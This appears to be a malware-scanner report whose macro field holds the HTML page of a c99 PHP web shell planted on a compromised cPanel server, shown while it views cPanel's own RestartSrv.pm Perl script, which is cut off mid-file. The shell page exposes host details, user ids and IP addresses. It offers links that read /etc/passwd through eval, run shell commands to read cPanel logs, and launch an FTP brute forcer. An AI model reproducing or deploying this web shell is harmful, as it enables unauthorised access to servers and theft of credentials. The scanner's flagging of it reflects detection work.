{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "command": "May run PowerShell commands",
            "exec": "May run an executable file or a system command using Excel 4 Macros",
            "lib": "May run code from a DLL",
            "mkdir": "May create a directory",
            "open": "May open a file",
            "output": "May write to a file",
            "run": "May run an executable file or a system command",
            "system": "May run an executable file or a system command on a Mac",
            "windows": "May enumerate application windows",
            "write": "May write to a file"
        },
        "macro": "GIF89;a\n<html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1251\"><meta http-equiv=\"Content-Language\" content=\"en-us\"><title>c99 v0.0.1 SYN-MOD [SYNSTA] @www.charmainesinclairlive.co.uk</title><STYLE>TD { FONT-SIZE: 8pt; COLOR: #ebebeb; FONT-FAMILY: verdana;}BODY { scrollbar-face-color: #800000; scrollbar-shadow-color: #101010; scrollbar-highlight-color: #101010; scrollbar-3dlight-color: #101010; scrollbar-darkshadow-color: #101010; scrollbar-track-color: #101010; scrollbar-arrow-color: #101010; font-family: Verdana;}TD.header { FONT-WEIGHT: normal; FONT-SIZE: 10pt; BACKGROUND: #7d7474; COLOR: white; FONT-FAMILY: verdana;}A { FONT-WEIGHT: normal; COLOR: #dadada; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A.Links { COLOR: #ffffff; TEXT-DECORATION: none;}A.Links:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; TEXT-DECORATION: none;}A:hover { COLOR: #ffffff; TEXT-DECORATION: underline;}.skin0{position:absolute; width:200px; border:2px solid black; background-color:menu; font-family:Verdana; line-height:20px; cursor:default; visibility:hidden;;}.skin1{cursor: default; font: menutext; position: absolute; width: 145px; background-color: menu; border: 1 solid buttonface;visibility:hidden; border: 2 outset buttonhighlight; font-family: Verdana,Geneva, Arial; font-size: 10px; color: black;}.menuitems{padding-left:15px; padding-right:10px;;}input{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}textarea{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}button{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}select{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}option {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}iframe {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}p {MARGIN-TOP: 0px; MARGIN-BOTTOM: 0px; LINE-HEIGHT: 150%}blockquote{ font-size: 8pt; font-family: Courier, Fixed, Arial; border : 8px solid #A9A9A9; padding: 1em; margin-top: 1em; margin-bottom: 5em; margin-right: 3em; margin-left: 4em; background-color: #B7B2B0;}body,td,th { font-family: verdana; color: #d9d9d9; font-size: 11px;}body { background-color: #000000;}</style></head><BODY text=#ffffff bottomMargin=0 bgColor=#000000 leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwidth=0><center><TABLE style=\"BORDER-COLLAPSE: collapse\" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1 bordercolor=\"#C0C0C0\"><tr><th width=\"101%\" height=\"15\" nowrap bordercolor=\"#C0C0C0\" valign=\"top\" colspan=\"2\"><p><font face=Webdings size=6><b>!</b></font><a href=\"?\"><font face=\"Verdana\" size=\"5\"><b>c99 v0.0.1 SYN-MOD [SYNSTA]</b></font></a><font face=Webdings size=6><b>!</b></font></p></center></th></tr><tr><td><p align=\"left\"><b>Software:&nbsp;Apache. <a href=\"?act=phpinfo\" target=\"_blank\"><b><u>PHP/5.2.9</u></b></a></b>&nbsp;</p><p align=\"left\"><b>uname -a:&nbsp;Linux wc3.titleworkspace.com 2.6.18-194.32.1.el5 #1 SMP Wed Jan 5 17:53:09 EST 2011 i686</b>&nbsp;</p><b>Disabled functions</b> : <b><font color=green>NONE</font></b><p align=\"left\"><b>We are: uid=608(chsclair) gid=605(chsclair) groups=605(chsclair)<br>context=system_u:system_r:crond_t:s0-s0:c0.c1023<br/>cURL: <b><font color=green>ON</font><br/>MySQL: <b><font color=green>ON</font></b><br/>MSSQL: <b><font color=red>OFF</font><br/>PostgreSQL: <b><font color=red>OFF</font><br/>Oracle: <b><font color=red>OFF</font> </b>&nbsp;</p><p align=\"left\"><b>Safe-mode:&nbsp;<font color=green>OFF (not secure)</font></b></p><p align=\"left\"><a href=\"?act=ls&d=%2F&sort=0a\"><b>/</b></a><a href=\"?act=ls&d=%2Fscripts%2F&sort=0a\"><b>scripts/</b></a>&nbsp;&nbsp;&nbsp;<b><font color=white>drwxr-xr-x</font></b><br><b>Free 6.76 GB of 7.65 GB (88.4%)</b><br><b>Your ip: <a href=http://84.177.125.247>84.177.125.247</a> - Server ip: <a href=http://109.75.162.166>109.75.162.166</a></b><br/><a href=\"?\"><hr><b>[Home]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=search&d=%2Fscripts%2F\"><b>[Search]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=fsbuff&d=%2Fscripts%2F\"><b>[Buffer]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=encoder&d=%2Fscripts%2F\"><b>[Encoder]</b></b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=tools&d=%2Fscripts%2F\"><b>[Tools]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=processes&d=%2Fscripts%2F\"><b>[Processes]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=ftpquickbrute&d=%2Fscripts%2F\"><b>[FTP Brute Forcer]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=security&d=%2Fscripts%2F\"><b>[Server Security Information]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=sql&d=%2Fscripts%2F\"><b>[SQL Manager]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=eval&d=%2Fscripts%2F&eval=readfile('/etc/passwd');\"><b>[Eval PHP code]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=selfremove\"><b>[Self remove]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=cmd&cmd=cat+%2Fvar%2Fcpanel%2Faccounting.log&cmd_txt=1&submit=Execute\"><b>[Cpanel Logs]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;</p></td></tr></table><br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"100%\" valign=\"top\"><b>Viewing file:&nbsp;&nbsp;&nbsp;&nbsp;[pm]&nbsp;RestartSrv.pm (22.59 KB) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color=white>-rw-r--r--</font></b><br>Select action/file-type:<br> <a href=\"?act=f&f=RestartSrv.pm&ft=info&d=%2Fscripts%2F\"><b>[hex]</b></a> (<a href=\"?act=f&f=RestartSrv.pm&ft=info&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=RestartSrv.pm&ft=html&d=%2Fscripts%2F\"><b>[html]</b></a> (<a href=\"?act=f&f=RestartSrv.pm&ft=html&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=RestartSrv.pm&ft=txt&d=%2Fscripts%2F\"><b><u>[txt]</u></b></a> (<a href=\"?act=f&f=RestartSrv.pm&ft=txt&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=RestartSrv.pm&ft=code&d=%2Fscripts%2F\"><b>[Code]</b></a> (<a href=\"?act=f&f=RestartSrv.pm&ft=code&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=RestartSrv.pm&ft=phpsess&d=%2Fscripts%2F\"><b>[Session]</b></a> (<a href=\"?act=f&f=RestartSrv.pm&ft=phpsess&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=RestartSrv.pm&ft=exe&d=%2Fscripts%2F\"><b>[exe]</b></a> (<a href=\"?act=f&f=RestartSrv.pm&ft=exe&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=RestartSrv.pm&ft=sdb&d=%2Fscripts%2F\"><b>[SDB]</b></a> (<a href=\"?act=f&f=RestartSrv.pm&ft=sdb&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=RestartSrv.pm&ft=img&d=%2Fscripts%2F\"><b>[gif]</b></a> (<a href=\"?act=f&f=RestartSrv.pm&ft=img&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=RestartSrv.pm&ft=ini&d=%2Fscripts%2F\"><b>[ini]</b></a> (<a href=\"?act=f&f=RestartSrv.pm&ft=ini&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=RestartSrv.pm&ft=download&d=%2Fscripts%2F\"><b>[download]</b></a> (<a href=\"?act=f&f=RestartSrv.pm&ft=download&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=RestartSrv.pm&ft=notepad&d=%2Fscripts%2F\"><b>[rtf]</b></a> (<a href=\"?act=f&f=RestartSrv.pm&ft=notepad&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=RestartSrv.pm&ft=edit&d=%2Fscripts%2F\"><b>[change]</b></a> (<a href=\"?act=f&f=RestartSrv.pm&ft=edit&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) |<hr size=\"1\" noshade><pre>#!/usr/bin/perl\n# cpanel - RestartSrv.pm                          Copyright(c) 2010 cPanel, Inc.\n#                                                           All rights Reserved.\n# copyright@cpanel.net                                         http://cpanel.net\n# This code is subject to the cPanel license. Unauthorized copying is prohibited\n\nBEGIN { unshift @INC, '/usr/local/cpanel'; }\n\nuse strict;\nuse IPC::Open2                   ();\nuse Cpanel::CleanupStub          ();\nuse Cpanel::Config::LoadCpConf   ();\nuse Cpanel::AccessIds            ();\nuse Cpanel::FileUtils::TouchFile ();\nuse Cpanel::Proc                 ();\nuse Cpanel::Services             ();\n\neval {\n    local $SIG{'__DIE__'};\n    require Storable;\n}; #for loadcpconf\n\n$ENV{'RESTARTSRV'} = 1;\n\nmy $restartsrvlog = '/var/log/restartsrv_err.log';\n\nsub loadcpconfig {\n    goto &amp;Cpanel::Config::LoadCpConf::loadcpconf;\n}\n\nsub setuppath {\n    my @PDIRS = ( '/bin', '/usr/bin', '/sbin', '/usr/sbin', '/usr/local/bin', '/usr/local/sbin' );\n    my @EPDIRS;\n    foreach my $pdir (@PDIRS) {\n        next if !-e $pdir;\n        push @EPDIRS, $pdir;\n    }\n    $ENV{'PATH'} = join( ':', @EPDIRS );\n}\n\nsub parseargv {\n    my $restart = 1;\n    my $check   = 0;\n    my $status  = 0;\n    my $verbose = 0;\n    while ( $#ARGV != -1 ) {\n        $_ = $ARGV[0];\n        if (/^\\-\\-/) {\n            my $arg = shift(@ARGV);\n            $arg =~ s/^\\-\\-//g;\n            $arg =~ tr/[A-Z]/[a-z]/;\n            if ( $arg eq 'status' ) { $status = 1; $restart = 0; }\n            if ( $arg eq 'check' )  { $check  = 1; $restart = 0; }\n            if ( $arg eq 'verbose' ) { $verbose = 1; }\n            if ( $arg eq 'stop' )    { $restart = -1; }\n        }\n        else {\n            last;\n        }\n    }\n    return ( $restart, $check, $status, $verbose );\n}\n\nsub getinitfile {\n    my ( $service, $system ) = @_;\n    my $strtscript;\n    my @initdirarray;\n\n    if ( $system =~ m/Linux/i ) {\n        push @initdirarray, '/etc/init.d';\n        if ( -d '/etc/rc.d/init.d' &amp;&amp; !-l '/etc/rc.d/init.d' ) {\n            push @initdirarray, '/etc/rc.d/init.d';\n        }\n    }\n    else {\n        return if $service eq 'named';    # Kludge because we don't have a valid init script on FreeBSD\n        push @initdirarray, '/usr/local/etc/rc.d', '/etc/rc.d';\n    }\n\n    foreach my $initdir (@initdirarray) {\n        my @initfiles;\n        if ( opendir my $dh, $initdir ) {\n            @initfiles = readdir $dh;\n            closedir $dh;\n        }\n\n        my $partial_match;\n        my $numeric_match;\n        foreach my $strtscript (@initfiles) {\n            next if $strtscript =~ m/^\\./;\n            next if $strtscript =~ m/\\.rpm[a-z]+$/;    # expanded match for .rpmorig, etc.\n            next if !-f $initdir . '/' . $strtscript;\n            if ( -x _ ) {\n                if ( lc $strtscript eq lc $service ) {\n                    return &quot;$initdir/$strtscript&quot;;\n                }\n                elsif ( !$partial_match &amp;&amp; $strtscript =~ m/^\\Q$service\\E/i ) {\n                    $partial_match = $strtscript;\n                }\n                elsif ( !$numeric_match &amp;&amp; $strtscript =~ m/^[\\d\\.]+\\Q$service\\E/i ) {\n                    $numeric_match = $strtscript;\n                }\n            }\n        }\n        if ($partial_match) {\n            return &quot;$initdir/$partial_match&quot;;\n        }\n        if ($numeric_match) {\n            return &quot;$initdir/$numeric_match&quot;;\n        }\n    }\n    return;\n}\n\nsub getmanualserviceinfo {\n    my ( $system, $service, $notrequired ) = @_;\n    my $servicebin    = '';\n    my $serviceflags  = '';\n    my $serviceenable = '';\n    if ( $system =~ /freebsd/i ) {\n        if ( $service eq 'pure-ftpd' ) { $service = 'pureftpd'; }\n        my (@CF) = ( &quot;/etc/defaults/rc.conf&quot;, &quot;/etc/rc.conf&quot; );\n        foreach my $file (@CF) {\n            open( RCC, &quot;&lt;&quot;, $file );\n            while (&lt;RCC&gt;) {\n                if (/^[\\s\\t]*${service}_program=[\\&quot;\\']([^\\&quot;\\']+)/) {\n                    $servicebin = $1;\n                }\n                if (/^[\\s\\t]*${service}_enable=[\\&quot;\\']([^\\&quot;\\']+)/) {\n                    $serviceenable = $1;\n                }\n                if (/^[\\s\\t]*${service}_flags=[\\&quot;\\']([^\\&quot;\\']+)/) {\n                    $serviceflags = $1;\n                }\n            }\n            close(RCC);\n        }\n        if ( $servicebin eq '' ) {\n            if ( $notrequired != 1 ) {\n                if ( $service =~ /inet/i ) {\n                    open( RSTRTLG, '&gt;&gt;', $restartsrvlog );\n                    print RSTRTLG &quot;$service information could not be found. Starting inetd instead.&quot;;\n                    close(RSTRTLG);\n                }\n                else {\n                    die &quot;Sorry, $service information could not be found.&quot;;\n                }\n            }\n        }\n    }\n    else {\n        if (   !$ENV{'RSINSTALL'}\n            &amp;&amp; !-e &quot;/var/cpanel/restartsrv-install/$service&quot; ) {\n            if ( !-e '/var/cpanel/restartsrv-install' ) {\n                mkdir( '/var/cpanel/restartsrv-install', 0700 );\n            }\n            open( SI, '&gt;', &quot;/var/cpanel/restartsrv-install/$service&quot; );\n            close(SI);\n            print &quot;Warning: service restart called for a service that may\\n&quot;;\n            print &quot;not be installed.  Install is now being attempted!\\n&quot;;\n            system( '/scripts/ensurerpm', $service );\n            $ENV{'RSINSTALL'} = 1;\n            if ( -e &quot;/scripts/restartsrv_$service&quot; ) {\n                exec &quot;/scripts/restartsrv_$service&quot;;\n                exit;\n            }\n            else {\n                die &quot;I don't know how to start $service&quot;;\n            }\n        }\n        else {\n            die &quot;I don't know how to start $service&quot;;\n        }\n    }\n    return ( $servicebin, $serviceflags, $serviceenable );\n}\n\nsub find_pureftpd_service {\n    my ( $service, $servicebin, $processowner, $disabled ) = ( 'pure-ftpd', '', 'root', 0 );\n    my @ftpbinaries = qw( /usr/sbin/pure-ftpd /usr/local/sbin/pure-ftpd );\n    foreach my $ftpbin (@ftpbinaries) {\n        if ( -x $ftpbin ) {\n            if ( -e '/etc/' . $service . 'disable' ) { $disabled = 1; }\n            $servicebin = $ftpbin;\n            last;\n        }\n    }\n    return ( $service, $servicebin, $processowner, $disabled );\n}\n\nsub find_proftpd_service {\n    my ( $service, $servicebin, $processowner, $disabled ) = ( 'proftpd', '', 'nobody', 0 );\n    my @ftpbinaries = qw( /usr/sbin/proftpd /usr/local/sbin/proftpd /usr/local/libexec/proftpd );\n    foreach my $ftpbin (@ftpbinaries) {\n        if ( -x $ftpbin ) {\n            if ( -e '/etc/' . $service . 'disable' ) { $disabled = 1; }\n            $servicebin = $ftpbin;\n        }\n    }\n    return ( $service, $servicebin, $processowner, $disabled );\n}\n\nsub servicefixup {\n    my ( $system, $service ) = @_;\n    my $processowner = 'root';\n    my $iscript      = '';\n    my $manualstart  = 0;\n    my $servicebin   = '';\n    my $serviceflags = '';\n    my $disabled     = 0;\n\n    if ( -e '/var/cpanel/brokenfutex' ) {\n        $ENV{'LD_ASSUME_KERNEL'} = '2.4.1';\n    }\n\n    if ( $service eq 'ftpserver' || $service eq 'ftpd' ) {\n        if (   -e '/etc/ftpserverdisable'\n            || -e '/etc/ftpddisable' ) {\n            $disabled = 1;\n        }\n\n        my $cpconf_ref = Cpanel::Config::LoadCpConf::loadcpconf();\n        my $selected_ftpserver = $cpconf_ref-&gt;{'ftpserver'} ? $cpconf_ref-&gt;{'ftpserver'} : ''; # localize setting to prevent warnings\n\n        if ( $selected_ftpserver eq 'disabled' ) {\n            $disabled = 1;\n        }\n\n        # Attempt ftpd server lookup based upon the selected server\n        if ( $selected_ftpserver eq 'pure-ftpd' ) {\n            my ( $ftpd_service, $ftpd_bin, $ftpd_owner, $ftpd_disabled ) = find_pureftpd_service();\n            if ($ftpd_bin) {\n                $service      = $ftpd_service;\n                $servicebin   = $ftpd_bin;\n                $processowner = $ftpd_owner;\n                if ( !$disabled ) {\n                    $disabled = $ftpd_disabled;\n                }\n            }\n        }\n        elsif ( $selected_ftpserver eq 'proftpd' ) {\n            my ( $ftpd_service, $ftpd_bin, $ftpd_owner, $ftpd_disabled ) = find_proftpd_service();\n            if ($ftpd_bin) {\n                $service      = $ftpd_service;\n                $servicebin   = $ftpd_bin;\n                $processowner = $ftpd_owner;\n                if ( !$disabled ) {\n                    $disabled = $ftpd_disabled;\n                }\n            }\n        }\n\n        # Handle the condition where the service may be disabled or the desired\n        # ftpd server is not installed\n        if ( !$servicebin ) {\n            if ( $selected_ftpserver ne 'pure-ftpd' ) {\n                my ( $ftpd_service, $ftpd_bin, $ftpd_owner, $ftpd_disabled ) = find_pureftpd_service();\n                if ($ftpd_bin) {\n                    $service      = $ftpd_service;\n                    $servicebin   = $ftpd_bin;\n                    $processowner = $ftpd_owner;\n                    if ( !$disabled ) {\n                        $disabled = $ftpd_disabled;\n                    }\n                }\n            }\n            if ( !$servicebin &amp;&amp; $selected_ftpserver ne 'proftpd' ) {\n                my ( $ftpd_service, $ftpd_bin, $ftpd_owner, $ftpd_disabled ) = find_proftpd_service();\n                if ($ftpd_bin) {\n                    $service      = $ftpd_service;\n                    $servicebin   = $ftpd_bin;\n                    $processowner = $ftpd_owner;\n                    if ( !$disabled ) {\n                        $disabled = $ftpd_disabled;\n                    }\n                }\n            }\n        }\n\n        if ( $servicebin eq '' ) {\n            die &quot;Ftp server is not installed. Exiting.&quot;;\n        }\n        $iscript = getinitfile( $service, $system );\n        if ( $iscript eq '' ) {\n            $manualstart = 1;\n        }\n        if ( $manualstart == 0 ) {\n            $manualstart = &amp;needsmanualstart( $system, $service );\n        }\n        if ( $manualstart &amp;&amp; $servicebin =~ m/pure/i &amp;&amp; $system =~ m/freebsd/i ) {\n            $servicebin   = '/usr/local/sbin/pure-config.pl';\n            $serviceflags = '/usr/local/etc/pure-ftpd.conf';\n        }\n    }\n    elsif ( $service eq 'syslog' ) {\n        if ( -e '/etc/syslogdisable' || -e '/etc/syslogddisable' ) {\n            $disabled = 1;\n        }\n        if ( $system =~ /freebsd/i ) {\n            $service = 'syslogd';\n        }\n        if ( -e '/etc/gentoo-release' ) {\n            $service      = 'syslogd';\n            $processowner = 'root';\n            $iscript      = getinitfile( 'sysklogd', $system );\n        }\n        if ( !$iscript ) {\n            $iscript = getinitfile( $service, $system );\n        }\n        if ( $iscript eq '' ) {\n            ( $servicebin, $serviceflags ) = getmanualserviceinfo( $system, $service );\n            $manualstart = 1;\n        }\n        if ( $manualstart == 0 ) {\n            $manualstart = &amp;needsmanualstart( $system, $service );\n        }\n        if ( -e '/etc/trustix-release' &amp;&amp; getpwnam('syslog') ) {\n            $processowner = 'syslog';\n        }\n    }\n    elsif ( $service eq 'rsyslog' ) {\n        if ( -e '/etc/rsyslogdisable' || -e '/etc/rsyslogddisable' ) {\n            $disabled = 1;\n        }\n        if ( !$iscript ) {\n            $iscript = getinitfile( $service, $system );\n        }\n        if ( $iscript eq '' ) {\n            ( $servicebin, $serviceflags ) = getmanualserviceinfo( $system, $service );\n            $manualstart = 1;\n        }\n        if ( $manualstart == 0 ) {\n            $manualstart = &amp;needsmanualstart( $system, $service );\n        }\n    }\n    elsif ( $service eq 'inetd' ) {\n        if ( -e '/etc/inetddisable' || -e '/etc/xinetddisable' ) {\n            $disabled = 1;\n        }\n        if ( $system =~ /freebsd/i ) {\n            my $xinetdenable = 0;\n            my @CF           = qw( /etc/defaults/rc.conf /etc/rc.conf );\n            foreach my $file (@CF) {\n                open( RCC, '&lt;', $file );\n                while (&lt;RCC&gt;) {\n                    if (/^[\\s\\t]*inetd_program=\\&quot;([^\\&quot;]+)\\&quot;/) {\n                        $servicebin = $1;\n                        if ( !-x $servicebin ) {\n\n                            #If the bin in not executable use inetd\n                            $manualstart = 1;\n                        }\n                    }\n                    if (/^[\\s\\t]*xinetd_enable=\\&quot;(yes|true|1)\\&quot;/i) {\n                        $xinetdenable = 1;\n                    }\n                }\n                close(RCC);\n            }\n            if ( ( $servicebin =~ /xinetd$/i || $xinetdenable == 1 )\n                &amp;&amp; -e '/etc/xinetd.conf' ) {\n                $service = 'xinetd';\n                $iscript = getinitfile( $service, $system );\n                if ( $iscript ne '' &amp;&amp; $xinetdenable == 0 ) {\n                    $manualstart = 1;\n                }\n                else {\n                    $servicebin = 'usexinetd';\n                }\n            }\n            else {\n\n                # Unless xinetd is properly configured, use inetd\n                $manualstart = 1;\n            }\n            if ( $servicebin eq '' || $manualstart == 1 ) {\n                $service      = 'inetd';\n                $servicebin   = '/usr/sbin/inetd';\n                $serviceflags = '-wW';\n                $manualstart  = 1;\n            }\n        }\n        else {\n            $service = 'xinetd';\n            $iscript = getinitfile( $service, $system );\n        }\n    }\n    elsif ( $service eq 'postgresql' ) {\n        if (   -e '/etc/postgresqldisable'\n            || -e '/etc/postgresdisable'\n            || -e '/etc/postmasterdisable' ) {\n            $disabled = 1;\n        }\n\n        # Get init script while service is stil postgresql\n        $iscript = getinitfile( $service, $system );\n        if ( $system =~ /freebsd/i ) {\n            $service = 'postgres';\n        }\n        else {\n            $service = 'postmaster';\n        }\n        if ( -d '/var/lib/pgsql/data' ) {\n            if (   !-e &quot;/var/lib/pgsql/data/PG_VERSION&quot;\n                &amp;&amp; !-e &quot;/var/lib/pgsql/data/base&quot;\n                &amp;&amp; !-e &quot;/var/lib/pgsql/data/global&quot;\n                &amp;&amp; -e &quot;/usr/bin/initdb&quot; ) {\n                print 'Postgres database is not initialized...initializing it...';\n                open( PGA, '&lt;', '/var/lib/pgsql/data/pg_hba.conf' );\n                my @PGA = &lt;PGA&gt;;\n                close(PGA);\n                unlink('/var/lib/pgsql/data/pg_hba.conf');\n                unlink('/var/lib/pgsql/data/pg_hbc.conf');\n                my $pg_user = 'pgsql';\n                if ( getpwnam('postgres') ) {\n                    $pg_user = 'postgres';\n                }\n                system( 'su', '-l', $pg_user, '-c', '/usr/bin/initdb' );\n                open( PGA, '&gt;', '/var/lib/pgsql/data/pg_hba.conf' );\n                foreach (@PGA) { print PGA; }\n                close(PGA);\n                print &quot;Done\\n&quot;;\n            }\n        }\n        if ( $system =~ /freebsd/i ) {\n            $processowner = 'pgsql';\n        }\n        else {\n            $processowner = 'postgres';\n        }\n        if ( $iscript eq '' ) {\n            $manualstart = 1;\n        }\n    }\n    elsif ( $service eq 'named' || $service eq 'nsd' ) {\n        if (   -e '/etc/nameddisable'\n            || -e '/etc/binddisable'\n            || -e '/etc/dnsdisable' ) {\n            $disabled = 1;\n        }\n        if ( $system =~ /freebsd/i ) {\n            $processowner = 'bind';\n            if ( $service eq 'named' ) {\n                ( $servicebin, $serviceflags ) = getmanualserviceinfo( $system, $service );\n                $manualstart = &amp;needsmanualstart( $system, $service );\n            }\n        }\n        else {\n            $processowner = 'named';\n        }\n        $iscript = getinitfile( $service, $system );\n        if ( $iscript eq '' ) {\n            $manualstart = 1;\n        }\n    }\n    return ( $processowner, $service, $iscript, $manualstart, $servicebin, $serviceflags, $disabled );\n}\n\nsub getspamdopts {\n    my $cpspamdconf     = '/etc/cpspamd.conf';\n    my $spamdoptions    = '';\n    my $socketpath      = '';\n    my $allowedips      = '--allowed-ips=127.0.0.1';\n    my $maxconnperchild = '';\n    my $maxchildren     = '--max-children=5';\n    my $maxspare        = '';\n    my $pidfile         = '--pidfile=/var/run/spamd.pid';\n    my $localonly       = '';\n    my $timeouttcp      = '';\n    my $timeoutchild    = '';\n    if ( -e $cpspamdconf ) {\n        open( SPAMD, &quot;&lt;&quot;, $cpspamdconf );\n        while (&lt;SPAMD&gt;) {\n            if ( !(/^[\\s\\t]*$/) &amp;&amp; !(/^[\\s\\t]*\\#.*$/) ) {\n                chomp();\n                my ( $option, $value ) = split( '=', $_ );\n                next if ( !defined $value || $value eq '' );\n                if ( $option eq 'allowedips' ) {\n                    $allowedips = &quot;--allowed-ips=${value}&quot;;\n                }\n                elsif ( $option eq 'socketpath' ) {\n                    $socketpath = &quot;--socketpath=${value}&quot;;\n                }\n                elsif ( $option eq 'maxconnperchild' ) {\n                    $maxconnperchild = &quot;--max-conn-per-child=${value}&quot;;\n                }\n                elsif ( $option eq 'maxspare' ) {\n                    $maxspare = &quot;--max-spare=${value}&quot;;\n                }\n                elsif ( $option eq 'maxchildren' ) {\n                    $maxchildren = &quot;--max-children=${value}&quot;;\n                }\n                elsif ( $option eq 'pidfile' ) {\n                    $pidfile = &quot;--pidfile=${value}&quot;;\n                }\n                elsif ( $option eq 'local' ) {\n                    $localonly = '--local';\n                }\n                elsif ( $option eq 'timeouttcp' ) {\n                    $timeouttcp = &quot;--timeout-tcp=${value}&quot;;\n                }\n                elsif ( $option eq 'timeoutchild' ) {\n                    $timeoutchild = &quot;--timeout-child=${value}&quot;;\n                }\n            }\n        }\n    }\n    close(SPAMD);\n    $spamdoptions = $localonly . ' ' . $timeoutchild . ' ' . $timeouttcp . ' ' . ( $socketpath ? $socketpath : $allowedips ) . ' ' . $maxconnperchild . ' ' . $pidfile . ' ' . $maxchildren . ' ' . $maxspare;\n    return $spamdoptions;\n}\n\nsub spamdcheck {\n    my $spamdstat = 0;\n\n    my $raw_out;\n    my $opt = getspamdopts();\n\n    if ( !-x '/usr/bin/spamc' ) { return $spamdstat; }\n\n    local $SIG{'ALRM'} = sub { die 'timeout' };\n\n    _check_cpanel_spamassasin_dir();\n\n    eval {\n        my $pid;\n\n        # spamc aborts connection after 600 seconds by default\n        alarm(620);\n        if ( $opt =~ /--socketpath=(\\S+)/ ) {\n            $pid = IPC::Open2::open2( \\*RDRFH, \\*WTRFH, '/usr/bin/spamc', '-u','cpanel','-U', $1 );\n        }\n        else {\n            $pid = IPC::Open2::open2( \\*RDRFH, \\*WTRFH, '/usr/bin/spamc','-u','cpanel' );\n        }\n        print WTRFH &lt;&lt;'EOM';\nSubject: Test spam mail (GTUBE)\nMessage-ID: &lt;GTUBE1.1010101@example.net&gt;\nDate: Wed, 23 Jul 2003 23:30:00 +0200\nFrom: Sender &lt;sender@example.net&gt;\nTo: Recipient &lt;recipient@example.net&gt;\nPrecedence: junk\nMIME-Version: 1.0\nContent-Type: text/plain; charset=us-ascii\nContent-Transfer-Encoding: 7bit\n\nThis is the GTUBE, the\n        Generic\n        Test for\n        Unsolicited\n        Bulk\n        Email\n\nIf your spam filter supports it, the GTUBE provides a test by which you\ncan verify that the filter is installed correctly and is detecting incoming\nspam. You can send yourself a test mail containing the following string of\ncharacters (in upper case and with no white spaces and line breaks):\n\nXJS*C4JDBQADN1.NSBN3*2IDNEN*GTUBE-STANDARD-ANTI-UBE-TEST-EMAIL*C.34X\n\nYou should send this test mail from an account outside of your network.\n\nEOM\n\n        # Close the write file handle\n        close(WTRFH);\n\n        # Process command output\n        while (&lt;RDRFH&gt;) {\n            $raw_out .= $_;\n            if (/X-Spam-Status\\: Yes/) {\n                $spamdstat = 1;\n            }\n        }\n\n        # Close the read file handle\n        close(RDRFH);\n        waitpid( $pid, 0 );\n        alarm(0);\n    };\n\n    if ($@) {\n        unless ( $@ =~ /timeout/ ) {\n            alarm(0);\n            die;\n        }\n    }\n\n    return($spamdstat,$raw_out) if wantarray;\n    return $spamdstat;\n}\n\nsub postgresqlfixup {\n    my ($system)   = @_;\n    my $postmaster = '';\n    my $pgctl      = '';\n    my $pgsqldir   = '';\n\n    if ( -x '/usr/bin/pg_ctl' ) {\n        $pgctl = '/usr/bin/pg_ctl';\n    }\n    else {\n        $pgctl = '/usr/local/bin/pg_ctl';\n    }\n    if ( -e '/var/lib/pgsql/data' ) {\n        $pgsqldir = '/var/lib/pgsql/data';\n    }\n    else {\n        $pgsqldir = '/usr/local/pgsql/data';\n    }\n    return ( $pgctl, $pgsqldir );\n}\n\nsub setuids {\n    goto &amp;Cpanel::AccessIds::setuids;\n}\n\nsub runasuser {\n    goto &amp;Cpanel::AccessIds::runasuser;\n}\n\nsub doomedprocess {\n    goto 